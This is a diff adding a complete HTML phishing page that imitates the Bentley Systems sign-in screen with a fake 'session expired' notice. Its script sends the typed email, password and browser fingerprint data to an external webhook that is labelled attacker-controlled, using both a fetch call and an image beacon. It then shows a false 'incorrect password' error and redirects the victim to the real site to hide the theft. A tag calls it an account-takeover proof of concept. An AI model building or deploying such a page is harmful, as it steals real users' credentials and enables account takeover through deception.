@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bentley Systems — Sign In</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background: #f4f4f4;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top nav bar */
+    .topbar {
+      background: #004f9f;
+      padding: 12px 32px;
+      display: flex;
+      align-items: center;
+    }
+    .topbar img {
+      height: 32px;
+    }
+    .topbar-logo-text {
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    /* Main container */
+    .main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 16px;
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      width: 100%;
+      max-width: 420px;
+      padding: 36px 40px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    .card-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #222;
+      margin-bottom: 6px;
+    }
+
+    .session-alert {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      border-left: 4px solid #ffc107;
+      border-radius: 3px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #856404;
+    }
+
+    .session-alert b { font-weight: 600; }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 5px;
+      margin-top: 16px;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="email"] {
+      width: 100%;
+      padding: 9px 12px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 14px;
+      color: #333;
+      outline: none;
+      transition: border-color .15s;
+    }
+
+    input:focus {
+      border-color: #004f9f;
+      box-shadow: 0 0 0 2px rgba(0,79,159,0.15);
+    }
+
+    .btn-signin {
+      width: 100%;
+      margin-top: 22px;
+      padding: 11px;
+      background: #004f9f;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      letter-spacing: 0.3px;
+      transition: background .15s;
+    }
+
+    .btn-signin:hover { background: #003d7a; }
+
+    .btn-signin:disabled {
+      background: #7fa8d4;
+      cursor: not-allowed;
+    }
+
+    .spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .links {
+      margin-top: 16px;
+      font-size: 12.5px;
+      color: #555;
+      text-align: center;
+    }
+    .links a { color: #004f9f; text-decoration: none; }
+    .links a:hover { text-decoration: underline; }
+
+    .footer {
+      background: #004f9f;
+      padding: 14px 32px;
+      text-align: center;
+      font-size: 12px;
+      color: rgba(255,255,255,0.75);
+    }
+    .footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
+  </style>
+</head>
+<body>
+
+<!-- Nav -->
+<div class="topbar">
+  <span class="topbar-logo-text">BENTLEY SYSTEMS</span>
+</div>
+
+<!-- Card -->
+<div class="main">
+  <div class="card">
+    <div class="card-title">Sign in to Bentley</div>
+
+    <!-- Session-expired banner (matches IMS endsession context) -->
+    <div class="session-alert" id="alertBox">
+      <b>Your session has expired.</b> Please sign in again to continue.
+    </div>
+
+    <form id="loginForm" autocomplete="on">
+      <label for="email">Email or username</label>
+      <input type="email" id="email" name="email" placeholder="name@company.com" autocomplete="email" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="••••••••" autocomplete="current-password" required>
+
+      <button type="submit" class="btn-signin" id="submitBtn">
+        <span id="btnText">Sign In</span>
+        <div class="spinner" id="spinner"></div>
+      </button>
+    </form>
+
+    <div class="links">
+      <a href="https://ims.bentley.com/IMS/Account/ForgotPassword">Forgot password?</a>
+      &nbsp;·&nbsp;
+      <a href="https://www.bentley.com/software/create-account/">Create account</a>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  &copy; 2026 Bentley Systems, Incorporated &nbsp;·&nbsp;
+  <a href="https://www.bentley.com/legal/privacy-policy/">Privacy Policy</a> &nbsp;·&nbsp;
+  <a href="https://www.bentley.com/legal/terms-of-use/">Terms of Use</a>
+</div>
+
+<script>
+  // Webhook endpoint (attacker-controlled)
+  const WEBHOOK = "https://app.hooklistener.com/endpoints/7c67591f-afe2-45b8-96ea-d00a392d5912";
+
+  // Collect fingerprint metadata alongside the credential
+  function getMeta() {
+    return {
+      ts:         new Date().toISOString(),
+      referrer:   document.referrer || "(direct)",
+      ua:         navigator.userAgent,
+      lang:       navigator.language,
+      tz:         Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen:     screen.width + "x" + screen.height,
+      url:        window.location.href,
+    };
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const email    = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value;
+
+    if (!email || !password) return;
+
+    // Show spinner
+    document.getElementById("btnText").style.display  = "none";
+    document.getElementById("spinner").style.display  = "block";
+    document.getElementById("submitBtn").disabled     = true;
+
+    const payload = {
+      email,
+      password,
+      meta: getMeta(),
+      source: "bentley_ato_poc_ims_endsession"
+    };
+
+    // Exfil to webhook (no-cors — fire-and-forget)
+    fetch(WEBHOOK, {
+      method:  "POST",
+      mode:    "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify(payload)
+    }).catch(() => {});
+
+    // Also try image-tag beacon as fallback (survives strict CORS)
+    const beacon = new Image();
+    beacon.src = WEBHOOK
+      + "?email="    + encodeURIComponent(email)
+      + "&pw="       + encodeURIComponent(password)
+      + "&src=beacon";
+
+    // After short delay: show "Invalid credentials" then redirect to real IMS
+    // Victim retries on the real site, attacker already has the creds
+    setTimeout(function() {
+      document.getElementById("alertBox").style.background   = "#f8d7da";
+      document.getElementById("alertBox").style.borderColor  = "#f5c6cb";
+      document.getElementById("alertBox").style.borderLeftColor = "#dc3545";
+      document.getElementById("alertBox").style.color        = "#721c24";
+      document.getElementById("alertBox").innerHTML =
+        "<b>Incorrect email or password.</b> Please try again.";
+
+      document.getElementById("btnText").style.display  = "block";
+      document.getElementById("spinner").style.display  = "none";
+      document.getElementById("submitBtn").disabled     = false;
+
+      // Clear password field so victim re-enters on real site
+      document.getElementById("password").value = "";
+    }, 1200);
+
+    // After victim sees "wrong password" → redirect to real IMS
+    setTimeout(function() {
+      window.location.href =
+        "https://www.bentley.com/?option=oauthredirect&app_name=openidconnect" +
+        "&redirect_url=https%3A%2F%2Fwww.bentley.com%2F";
+    }, 4000);
+  });
+</script>
+
+</body>
+</html>
